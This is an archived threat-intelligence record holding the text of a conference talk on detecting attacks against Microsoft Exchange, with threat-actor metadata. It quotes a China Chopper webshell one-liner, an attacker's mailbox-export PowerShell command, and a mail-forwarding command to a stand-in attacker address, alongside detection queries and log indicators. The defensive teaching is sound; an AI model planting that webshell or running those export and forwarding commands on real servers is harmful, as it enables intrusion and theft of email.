{
    "id": "0cdb9e71-b195-44cf-9ff9-dd96e2f4fa2d",
    "created_at": "2022-10-25T16:48:12.738834Z",
    "updated_at": "2025-03-27T02:16:45.743101Z",
    "deleted_at": null,
    "sha1_hash": "678f764a6d388bfc88511913bc96422ba06be40d",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-02-20T23:21:01Z",
    "file_modification_date": "2017-02-20T23:22:29Z",
    "file_size": 2658803,
    "plain_text": "###### President Volexity, Inc.\n\n\nSESSION ID: HTA-F02\n\n#### Detecting and Responding to Advanced Threats within Exchange Environments\n\n###### Steven Adair\n President Volexity, Inc.\n\n\n-----\n\n###### Founder & President at Volexity\n\n Former Director of Cyber Intelligence at Verizon Terremark\n\n Previously stood-up and ran NASA’s Cyber Threat Analysis Program (CTAP)\n\n Longtime Shadowserver member\n\n Co-author of the book Malware Analyst’s Cookbook\n\n Assist organizations with combating cyber espionage, suppressing attacks, and eradicating threats from their networks.\n\n\n-----\n\n###### Why Exchange?\n\n What Attackers are Doing with Exchange\n Easy Mode (Phishing) Advanced Mode ([Web] Shells) Expert Mode (Digital Surveillance, Exfiltration, PowerShell)\n\n Detection and Defense\n Get back in the driver’s seat\n\n\n-----\n\n###### By the end of this session..\n You should have a firm understanding of how and why Exchange is such a large target and how it is being abused\n Immediately following this presentation you will be given:\n A URL with a cheat sheet of all the commands we show in the slides (no need to rush to write them down) My contact information if you have any questions or follow up\n In the weeks and months to follow you should:\n Be able to search for signs of compromise on your Exchange server in a going forward basis Tighten security settings to make it more difficult for an intruder to compromise your environment or at least go undetected\n\n\n-----\n\n# Microsoft Exchange\n\n###### A Critical Target?\n\n\n-----\n\n###### Absolutely critical infrastructure for most organizations\n Facilitates both internal and external communication If e-mail doesn’t work, the business isn’t working\n\n Your business is big business to others– this infrastructure has critical importance to an attacker\n Business Intelligence Intellectual Property Contacts\n\n\n-----\n\n###### In many organizations Exchange servers are:\n One of the only systems exposed to the Internet Generally not segmented from the LAN and tied into Domain\n\n Not monitored very closely\n Connections are typically SSL/TLS encrypted Frequently load balanced and spread amongst many servers Extremely noisy and high-traffic (bandwidth and connections) IT Security teams often don’t know what’s “normal”\n\n\n-----\n\n# Easy Mode: Phishing\n\n###### Attackers Don’t Need to be Advanced\n\n\n-----\n\n###### Pros Cons\n\n Easy / Low barrier to entry May not be as effective against specific\n targets or smaller organizations\n In a sizable organization, someone will fall victim No guarantee anything interesting in\n e-mail\n Quick and easy e-mail access\n Wider the cast net of targets, higher odds of being detected\n\n\n-----\n\n###### 419 Scammer\n UK Lottery / Family Member Killed in Plane Crash in Nigeria Low Threat\n\n Hacktivists - Syrian Electronic Army (SEA)\n Access e-mail looking for Twitter and social media passwords Moderate/High Threat\n\n APT – Common from CN and RU groups\n Steal Data, Man-in-the-Mailbox, and Pivot to Network Access High Threat\n\n\n-----\n\n-----\n\n###### Wekby\n Responsible for several high-profile public breaches Frequently launches campaigns with malware and phishing\n — Fake Adobe Flash or Microsoft Update\n — Citrix Login Phishing\n — OWA Phishing Not overly sophisticated but wildly successful \n — Attacker use what works and this group is proof of that\n\n\n-----\n\n-----\n\n###### Initially operated with sophisticated exploits\n SWC/Drive-by sites and Weaponized documents (Flash 0days) 0day privilege escalation (standalone and built-in exploits)\n\n Turned to low budget spamming links to EXEs or ZIPs with EXEs\n Installing Poison Ivy, Gh0st RAT, Remote RSS, Token Control (HTTP Browser), “KillYou” backdoor\n\n Started including phishing of user credentials ~2013\n Citrix OWA\n\n\n-----\n\n-----\n\n-----\n\n-----\n\n###### If malware campaign is not successful – phished credentials are the next best thing.\n\n Immediately attempt to use credentials on any resource that provides remote network access:\n Open Terminal Services / RDP Web / SSL VPN Citrix / Moka5 / VNC\n\n\n-----\n\n###### Security Awareness Training\n\n Running Quarterly Live Phishing Exercises\n\n ✓ Two-Factor Authentication for OWA\n\n ✓ Mobile Device Management for Phones (ActiveSync)\n\n ✓ IP Address Restriction for Outlook Anywhere (Thick Clients)\n\n\n-----\n\n-----\n\n# Advanced Mode: [Web] Shells\n\n###### Attackers Hiding in Plain Sight\n\n\n-----\n\n###### More sophisticated APT actors with a foothold in an organization are focusing efforts on OWA servers\n Fall back persistence shells Primary access into network (malware that doesn’t beacon)\n\n Two main methods for backdooring OWA\n Typical ”China Chopper” webshell Custom compiled DLL as HTTP Module\n\n\n-----\n\n###### We still see ASPXSpy and other full featured (large) backdoors but the consistent move has been to China Chopper. Sample file named “ ”:\n```\n   owa.aspx\n   <%@ Page\n   Language=\"Jscript\"%><%eval(Request.Item[\"chopper\"],\n   \"unsafe\");%>\n\n```\n\n-----\n\n###### Standard URL to access OWA at a path similar to:\n\n https://mail.domain.com/owa/auth/logon.aspx\n\n Where do you think we would find the file owa.aspx?\n\n https://mail.domain.com/owa/auth/owa.aspx\n\n\n-----\n\n###### Attackers with administrative access typically place the shells in the following web directories:\n\n \\Program Files\\Microsoft\\Exchange Server\\V14\\ClientAccess\\owa\\auth\\\n\n \\inetpub\\wwwroot\\aspnet_client\\system_web\\2_0_5072\\\n\n\n-----\n\n###### Since at least 2012, APT attackers have been making custom .NET compiled binaries to backdoor OWA servers.\n\n Several revisions of the backdoors have supported the following:\n Shell Execution (China Chopper compatible) Shell Execution + Unencrypted Credential Logging Shell Execution + Encrypted Credential Logging\n\n\n-----\n\n###### Similar to the ASP.NET shell, they place a .DLL in the bin directory of one of OWA’s virtual sites\n The attackers then modify the web.config file to load the module\n Commonly used directories:\n\n \\Program Files\\Microsoft\\Exchange Server\\V14\\ClientAccess\\owa\\bin \\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\bin\n Most commonly observed backdoor file names:\n\n OwaAuth.DLL Microsoft.Exchange.Clients.Auth.dll\n\n\n-----\n\n###### This is what a normal / typical web.config might look like:\n\n Here’s what a modified web.config looks like:\n\n\n-----\n\n###### Some interesting strings from the DLL\n```\n    c:\\log\\text.txt\n    Name:\n    , Type:\n    /auth.owa\n    UserName:\n    username\n    , Password:\n    password\n    x.aspx\n\n```\n\n-----\n\n###### Some interesting strings from the DLL\n```\n    c:\\log\\text.txt <- file for logged credentials\n    Name:\n    , Type:\n    /auth.owa <- filename where OWA credentials are sent\n    UserName:\n    username   <- OWA username variable for input box\n    , Password:\n    password   <- OWA password variable for input box\n    x.aspx\n\n```\n\n-----\n\n###### Written in .NET C#\n\n Logs “captured” data with Base64 and DES in CBC mode\n\n All observed samples the DES key and IV have been the same value\n we have seen some custom ones and frequently “12345678”\n\n Logs are tab separated like \"{0}\\t{1}\\t{2}\\t{3}\\t{4}\\t{5}\" where:\n {0} = two random numbers between 0-999 multiplied together {1} = current time {2} = remote IP address {3} = username {4} = password {5} = user agent\n\n\n-----\n\n###### Sample log.txt might look like:\n\n BqAJ3yDfJJohcjbFEqByny7+q6yfR9bO01XBuHYfAWo6bSeLBaswm70gZq+21a862vWUAX3 M7CMF7WVbhdsM2lsoLOx82+MdwzqurgVoKZPy6tFvEZEDVuI7PxbeIHKReono3xEkmH9s 8dCigjLCKJ34qf9YH1nhuhBqzBVabSs0Tw6Fz7/zX2ktEbEEPMqCw+g2vMAEBNlzM872Two U+YKjGF8VX3dIBGvqwP4EbFq+0ZCg/fh3ag==\n\n Decoded:\n\n 239073 3/2/2015 10:22:09 AM  x.x.x.x <account name>   <password> Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36\n\n\n-----\n\n###### Passed via z1= and z2= and command code:\n\n Code 0: get logical drive strings Code 10: set a file or directory's creation, access, Code 1: directory listing (shows name and last write write times to a specified time time)\n Code 11: forces the victim server to initiate a GET\n Code 2: reading a file (download) request to another URL and download the file Code 3: writing a file (upload) Code 12: execute a process with redirected Code 4: delete a directory stdout/stderr, and report the results Code 5: appears to just be an echo (writes \"- Code 13: connect to an SQL database >|text|<-\" onto the page, where \"text\" is the Z1\n Code 14 and 15: exporting the database schema\n value\n and column information\n Code 6: writes a byte stream to disk\n Code 16: issue an SQL SELECT, EXEC, or DECLARE\n Code 7: copy a directory's contents\n statement\n Code 8: move a file or directory\n Code 17: issue a non-query based SQL command\n Code 9: create a directory\n\n\n-----\n\n```\n   D:\\HttpsExts\\HttpsExts\\obj\\Release\\OwaAuth.pdb\n   C:\\Users\\SyberSpace\\Desktop\\owa\\HttpsExts\\Https\n   Exts\\HttpsExts\\obj\\Release\\OwaAuth.pdb\n   \\Users\\ljw\\Documents\\prj\\dllshell\\Dllshell\\Dlls\n   hellexc2007\\obj\\Release\\Microsoft.Exchange.Clie\n   nts.Auth.pdb\n\n```\n\n-----\n\n###### Signs of the attacker’s activity have been captured on the OWA server by Exchange’s Client Access Server (CAS) logs.\n\n CAS logs are IIS logs that record access into an Exchange environment. In particular systems connecting via OWA, Outlook Anywhere, and ActiveSync.\n\n It turns out that a CAS log are a pretty great resource:\n log access to webshells and data exfiltration files log attackers that are using or attempting to use [stolen] credentials Bonus: an easy way to find what user is on a particular internal IP address.\n\n\n-----\n\n###### Popular China Chopper User-Agents:\n```\n     Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n     Mozilla/5.0 (compatible; Baiduspider/2.0;\n     +http://www.baidu.com/search/spider.html)\n     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/\n     bot.html)\n\n These might be good indicators as is for detection over the network, but remember we are looking IIS Logs.\n\n```\n\n-----\n\n###### In order to search/grep those User-Agents from the CAS (IIS) Logs, they need to have the spaces removed:\n```\n     Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n     Mozilla/5.0 (compatible; Baiduspider/2.0;\n     +http://www.baidu.com/search/spider.html)\n     Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/\n     bot.html)\n\n```\n\n-----\n\n###### In order to search/grep those User-Agents from the CAS (IIS) Logs, they need to have the spaces removed:\n```\n     Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1)\n     Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com\n     /search/spider.html)\n     Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/\n     bot.html)\n\n Now these strings can grep’d out of the CAS Logs for signs of badness.\n\n```\n\n-----\n\n###### File Integrity Monitoring\n The contents of the web folders on Microsoft Exchange do not change that frequently Easily monitor for new or modified files\n\n Access Log Monitoring\n Look for POST requests with 200 response to never before seen files\n\n\n-----\n\n# Expert Mode: E-mail Surveillance\n\n###### PowerShell: Friend or Enemy?\n\n\n-----\n\n###### Attackers are becoming creative when it comes to leveraging e-mail for digital surveillance.\n\n Leveraging their existing foothold and highly privileged access, the bad guys are using Exchange’s own sys admin tools against the organization\n Attackers are primarily conducting these operations via:\n — Shell on Exchange Server\n — Terminal Services via VPN connection\n — Command line access via existing RAT\n\n\n-----\n\n###### Attackers are directly accessing Microsoft Exchange servers via PowerShell command line interfaces or the GUI-based Management consoles to do the following:\n\n Export entire mailboxes for targeted users Assigning user accounts special permissions to access e-mail of targeted individuals (or the entire organization) Silently forward copies of all of a user’s inbound e-mail\n\n\n-----\n\n# Mailbox Exporting\n\n###### Not Just for System Administrators\n\n\n-----\n\n###### Mailbox exporting is a common system administration function\n Backup purposes Archival when user leaves organization eDiscovery\n\n APT attackers also take advantage of this great functionality\n Wholesale mailbox export of victim Incremental mailbox theft (since last visit)\n\n\n-----\n\n###### Using an OWA DLL backdoor attackers uploaded two files. The first file was;\n\n a.ps1 The file contained the following:\n```\n   New-MailboxExportRequest -Mailbox SmithJ -\n   ContentFilter {((Received -gt '06/20/2015 00:00:00') -\n   and (Received -lt '08/27/2015 23:59:58')) -or ((Sent -\n   gt '06/20/2015 0:00:00') -and (Sent -lt '08/31/2015\n   23:59:58'))} -FilePath \\\\127.0.0.1\\c$\\\"Program\n   Files\\Microsoft\\Exchange\n   Server\\V14\\ClientAccess\\owa\\auth\\smithj.pst\n\n```\n\n-----\n\n###### The second file the attackers uploaded was called\n\n WarpPowerShell.exe\n\n This was a file that let them avoid using the built-in console and PowerShell executables.\n Attackers simply execute the following with SYSTEM privileges on the OWA CAS server:\n```\n    WarpPowershell a.ps1\n\n```\n\n-----\n\n###### The attackers then exfiltrated the file right from the /auth/ folder in the OWA Virtual Directory.\n```\n   u_ex150901.log:2015-09-01 11:25:10 W3SVC1 CAS01\n   10.120.x.x GET /owa/auth/smithj.pst - 443 – x.x.x.x\n   HTTP/1.1 FDM+3.x\n   OutlookSession=1402b4e4ccd49acddab136d59d93a21 –\n   mail.<removed>.org 206 0 995 6634084 295 620174\n   u_ex150901.log:2015-09-01 11:25:31 W3SVC1 CAS01\n   10.120.x.x GET /owa/auth/smithj.pst - 443 – x.x.x.x\n   HTTP/1.1 FDM+3.x\n   OutlookSession=1402b4e4ccd49acddab136d59d93a21 –\n   mail.<removed>.org 206 0 995 6896820 294 643012\n\n```\n\n-----\n\n##### The attackers then exfiltrated the file right from the /auth/ folder in the OWA Virtual Directory.\n```\n   u_ex150901.log:2015-09-01 11:25:10 W3SVC1 CAS01\n   10.120.x.x GET /owa/auth/smithj.pst - 443 – x.x.x.x\n   HTTP/1.1 FDM+3.x\n   OutlookSession=1402b4e4ccd49acddab136d59d93a21 –\n   mail.<removed>.org 206 0 995 6634084 295 620174\n   u_ex150901.log:2015-09-01 11:25:31 W3SVC1 CAS01\n   10.120.x.x GET /owa/auth/smithj.pst - 443 – x.x.x.x\n   HTTP/1.1 FDM+3.x\n   OutlookSession=1402b4e4ccd49acddab136d59d93a21 –\n   mail.<removed>.org 206 0 995 6896820 294 643012\n\n```\n\n-----\n\n###### There are two fairly simple ways to keep an eye out for Mailbox Exports\n```\n    Running a PowerShell command to show pending and\n    successful Mailbox Exports.\n    Event Log Monitoring\n\n```\n\n-----\n\n-----\n\n###### MSExchange Management.evtx is your friend.\n\n Simple log – Look at Event ID: 1\n\n Can do a search on:\n “New-MailboxExportRequest”\n\n\n-----\n\n###### Looking for suspect file extensions in OWA logs is a great technique:\n```\n          .7z | .rar | .zip | .cab | .pst\n\n What if the attackers call the file something different? .jpg?\n\n In most cases we have observed, the exfil files have been split up into chunks and thus HTTP 206 Status Codes are logged.\n grep –F –e base/notify.wav -e “) 206 “ is a perfect way to find attackers grabbing files\n\n```\n\n-----\n\n# Digital Surveillance\n\n###### One Account to Rule Them All\n\n\n-----\n\n###### Last year we worked on a case where multiple APT groups had broken into and compromised a U.S.-based NGO.\n Several malware implants on servers and workstations Two different webshells were observed (Chopper) OWA backdoored (DLL)\n\n As part of our incident investigation, we examined their available CAS logs\n What we found was intriguing! \n\n\n-----\n\n###### Reviewing the CAS logs saw lots of suspect activity\n connections from a single external IP address (VPS) Several gigs of data being transferred All activity contains a Mac Outlook related User-Agent string\n\n Most importantly, the connection logs showed all of the connections were being made from an account named BESAdmin\n\n\n-----\n\n###### The besadmin a Domain [service] account used by the Blackberry Enterprise Server (BES) to send and receive e-mail on behalf of users that have a Blackberry.\n\n\n-----\n\n###### Suspicions arise given the following:\n besadmin does not actually have its own mailbox Massive amounts of transfer occurred Account has the ability to read e-mail from other mailboxes\n\n At this point we assume the account is being used to read e-mails from other users\n Exchange Impersonation\n\n\n-----\n\n###### Legitimate besadmin access will likely have the following characteristics\n Source IP of connections will be the local BES server User-Agent of connections will be NULL (autodiscover.xml) or similar to:\n\n Mozilla/4.0+(compatible;+MSIE+6.0;+MS+Web+Services+Client +Protocol+2.0.50727.4223)\n\n\n-----\n\n###### 2015-10-16 08:18:20 10.x.x.x POST /EWS/Exchange.asmx - 80 <removed>\\BESAdmin x.x.x.x MacOutlook/14.3.2.130206+(Intel+Mac+OS+X+10.8.3) 200 0 0 328\n\n 2015-10-16 08:18:22 10.x.x.x POST /EWS/Exchange.asmx - 80 <removed>\\BESAdmin x.x.x.x MacOutlook/14.3.2.130206+(Intel+Mac+OS+X+10.8.3) 200 0 0 328\n\n 2015-10-16 08:18:24 10.x.x.x POST /EWS/Exchange.asmx - 80 <removed>\\BESAdmin x.x.x.x MacOutlook/14.3.2.130206+(Intel+Mac+OS+X+10.8.3) 200 0 0 142065\n\n 2015-10-16 08:18:47 10.x.x.x POST /EWS/Exchange.asmx - 80 <removed>\\BESAdmin x.x.x.x MacOutlook/14.3.2.130206+(Intel+Mac+OS+X+10.8.3) 200 0 0 312\n\n x.x.x.x = External IP address from a hosting provider\n\n\n-----\n\n###### The attackers are still frequently connecting in and we are performing full packet capture.\n\n It is now trivial to extract out sessions to/from the attacker’s IP address and the Exchange Server (OWA) server.\n\n Now we have a bunch of encrypted traffic though, which still requires a bit of work to examine.\n\n\n-----\n\n###### When we want to look into Exchange/OWA sessions, we of course need to decrypt the traffic\n\n In order to do this we need two things:\n Full packet capture of the sessions of interest (we have this already) The private key associated with the certificate on the mail server\n — This is easily exported from Windows and the private key can be converted to a format that can be used to decrypt (RSA)\n\n\n-----\n\n###### Now that we have the traffic and the private key, we still need a tool to decrypt the it.\n\n These are a few of the tools we can use to assist us:\n```\n     Wireshark\n     Tshark\n     ChopShop\n     Dshell\n\n```\n\n-----\n\n```\n   POST /EWS/Exchange.asmx HTTP/1.1\n   User-Agent: MacOutlook/14.3.2.130206 (Intel Mac OS X\n   10.8.3)\n   Content-Type: text/xml\n   Authorization: Negotiate <removed>\n   Host: <removed>\n   Cookie: exchangecookie=<removed>\n   Content-Length: 610\n   Expect: 100-continue\n   HTTP/1.1 100 Continue\n\n```\n\n-----\n\n```\n  <?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope\n  xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\n  xmlns:m=\"http://schemas.microsoft.com/exchange/services/\n  2006/messages\"\n  xmlns:t=\"http://schemas.microsoft.com/exchange/services/\n  2006/types\"><s:Header><t:RequestServerVersion\n  Version=\"Exchange2007_SP1\"/><t:ExchangeImpersonation><t:\n  ConnectingSID><t:PrimarySmtpAddress>firstname.lastname@<\n  removed>.com</t:PrimarySmtpAddress></t:ConnectingSID></t\n  :ExchangeImpersonation></s:Header><s:Body><m:GetFolder><\n  m:FolderShape><t:BaseShape>IdOnly</t:BaseShape></m:Folde\n  rShape><m:FolderIds><t:DistinguishedFolderId\n  Id=\"msgfolderroot\"/></m:FolderIds></m:GetFolder></s:Body\n  ></s:Envelope>\n\n```\n\n-----\n\n```\n  <?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope\n  xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\n  xmlns:m=\"http://schemas.microsoft.com/exchange/services/\n  2006/messages\"\n  xmlns:t=\"http://schemas.microsoft.com/exchange/services/\n  2006/types\"><s:Header><t:RequestServerVersion\n  Version=\"Exchange2007_SP1\"/></s:Header><s:Body><m:GetFol\n  der><m:FolderShape><t:BaseShape>IdOnly</t:BaseShape></m:\n  FolderShape><m:FolderIds><t:DistinguishedFolderId\n  Id=\"sentitems\"><t:Mailbox><t:EmailAddress>firstname.last\n  name@<removed>.com</t:EmailAddress></t:Mailbox></t:Disti\n  nguishedFolderId></m:FolderIds></m:GetFolder></s:Body></\n  s:Envelope>\n\n```\n\n-----\n\n###### Traffic decryption confirmed our suspicion that the attackers were pulling down e-mail for multiple mailboxes\n\n Attackers were reading e-mail for 25 employees\n Included C-level executives and people in positions relevant to what we believe the attackers are after\n\n E-mail was downloaded nearly daily for each of the users with a full sync of their mailbox\n Inbox, Sent, Deleted Items, Calendar, etc.\n\n\n-----\n\n###### When using the BESAdmin account, attackers likely already have rights to read e-mail of everyone\n\n However, the attackers also created an account “EmailSyncSvc” and assigned it access to user mailboxes\n We have also seen random valid user assigned special access\n\n In this instance they opted to give themselves access to all mailboxes instead of just to the users they were interested in\n This actually makes proactively detecting this behavior easier\n\n\n-----\n\n###### Launching EMS and executing a query to list out all mailbox permissions is a great way to find accounts with access they should not have.\n\n This can be done on each account one-by-one in the Exchange Management Console or on all accounts with PowerShell via the Exchange Management Shell\n\n\n-----\n\n-----\n\n###### The resulting output will show data for each account similar to:\n```\n  \"<removed>.com/Media\n  Staff/media\",\"<REMOVED>\\EmailSyncSvc\",\"FullAcces\n  s”\n  \"<removed>.com/Media\n  Staff/media\",\"<REMOVED>\\BESAdmin\",\"FullAccess”\n  \"<removed>.com/Media\n  Staff/media\",\"<REMOVED>\\Domain\n  Admins\",\"FullAccess”\n  \"<removed>.com/Media\n  Staff/media\",\"<REMOVED>\\Enterprise\n  Admins\",\"FullAccess\"\n\n```\n\n-----\n\n# Prolonged Access to E-mail\n\n###### PowerShell and Mailbox Forwarding\n\n\n-----\n\n###### What if an attacker could continually read the e-mail critical personnel without:\n```\n    Accessing the target’s computer\n    Logging into an e-mail server\n    Leveraging malware\n    Creating any sort of connection into the victim’s\n    network\n\n```\n\n-----\n\n###### Turns out the bad guys have a few tricks up their sleeves and have used a technique to do everything on the previous slide\n\n C-Suite and other top executives targeted\n Copies of all inbound e-mail sent to attackers The targets, the IT Support staff, Exchange Administrators, and IT Security team had no idea\n\n\n-----\n\n###### PS Cmdlet to Modify Mailbox Target Exchange Mailbox\n```\n  [PS] Set-Mailbox -Identity ”Hillary Clinton\" -\n  DeliverToMailboxAndForward $true -\n  ForwardingSMTPAddress ”badguy44@gmail.com”\n\n Delivers E-mails to Hillary’s Inbox and Forwards a copy to badguy44@gmail.com\n\n```\n\n-----\n\n###### Simple.. What can be setup with PowerShell, can be found with PowerShell\n```\n   [PS] Get-Mailbox | Where\n   {($_.ForwardingSMTPAddress -ne $null)} | Select\n   Name, ForwardingSMTPAddress,\n   DeliverToMailboxAndForward\n\n```\n\n-----\n\n###### Sample output from PS query\n```\n Name ForwardingSMTPAddress DeliverToMailboxAndForward\n ---- --------------------- --------------------------\n Hillary Clinton smtp:badguy44@gmail.com True\n\n```\n\n-----\n\n# PowerShell Virtual Directory\n\n###### Exchange Remote Backdoor\n\n\n-----\n\n-----\n\n-----\n\n###### As you can see, attackers have a lot of ways to attack Exchange\n They also have a vested interest in doing so\n\n Many attacks against Exchange go unnoticed for many reasons:\n Extremely busy and high traffic server(s) Encrypted communication (SSL/TLS) Lack of familiarity with the signs of compromise\n\n Building defenses and treating Exchange servers like one of the organization’s crown jewels is the best way to stat ahead of the threat\n Logging, monitoring, and 2FA are the way to go\n\n\n-----\n\n###### Contact:\n sadair@volexity.com\n\n @stevenadair | @volexity\n\n PowerShell Cheat Sheet URL: https://www.volexity.com/rsa/powershell.txt\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://published-prd.lanyonevents.com/published/rsaus17/sessionsFiles/5009/HTA-F02-Detecting-and-Responding-to-Advanced-Threats-within-Exchange-Environments.pdf"
    ],
    "report_names": [
        "HTA-F02-Detecting-and-Responding-to-Advanced-Threats-within-Exchange-Environments.pdf"
    ],
    "threat_actors": [
        {
            "id": "c8aefee7-fb57-409b-857e-23e986cb4a56",
            "created_at": "2023-01-06T13:46:38.285223Z",
            "updated_at": "2025-03-27T02:00:02.79333Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "TG-0416",
                "SCANDIUM",
                "PLA Navy",
                "Wekby",
                "G0026",
                "DYNAMITE PANDA"
            ],
            "source_name": "MISPGALAXY:APT18",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f498e6b-3f0e-4f26-8cc7-52121e675643",
            "created_at": "2023-01-06T13:46:38.447274Z",
            "updated_at": "2025-03-27T02:00:02.835821Z",
            "deleted_at": null,
            "main_name": "Deadeye Jackal",
            "aliases": [
                "SyrianElectronicArmy"
            ],
            "source_name": "MISPGALAXY:Deadeye Jackal",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "76fc6d92-0710-4640-bfa7-3000fe3940a5",
            "created_at": "2022-10-25T16:07:24.251595Z",
            "updated_at": "2025-03-27T02:02:10.151254Z",
            "deleted_at": null,
            "main_name": "Syrian Electronic Army (SEA)",
            "aliases": [
                "ATK 196",
                "Deadeye Jackal",
                "Syria Malware Team",
                "Syrian Electronic Army",
                "TAG-CT2"
            ],
            "source_name": "ETDA:Syrian Electronic Army (SEA)",
            "tools": [
                "AndoServer",
                "CypherRat",
                "SLRat",
                "SandroRAT",
                "SilverHawk",
                "SpyNote",
                "SpyNote RAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "17b92337-ca5f-48bb-926b-c93b5e5678a4",
            "created_at": "2022-10-25T16:07:23.333316Z",
            "updated_at": "2025-03-27T02:02:09.74201Z",
            "deleted_at": null,
            "main_name": "APT 18",
            "aliases": [
                "APT 18",
                "Dynamite Panda",
                "Scandium",
                "TG-0416",
                "Wekby"
            ],
            "source_name": "ETDA:APT 18",
            "tools": [
                "AngryRebel",
                "AtNow",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HttpBrowser RAT",
                "HttpDump",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Pisloader",
                "QUICKBALL",
                "Roseam",
                "StickyFingers",
                "Token Control",
                "TokenControl",
                "hcdLoader"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041805,
    "ts_creation_date": 1487632861,
    "ts_modification_date": 1487632949,
    "files": {
        "pdf": "https://archive.orkl.eu/678f764a6d388bfc88511913bc96422ba06be40d.pdf",
        "text": "https://archive.orkl.eu/678f764a6d388bfc88511913bc96422ba06be40d.txt",
        "img": "https://archive.orkl.eu/678f764a6d388bfc88511913bc96422ba06be40d.jpg"
    }
}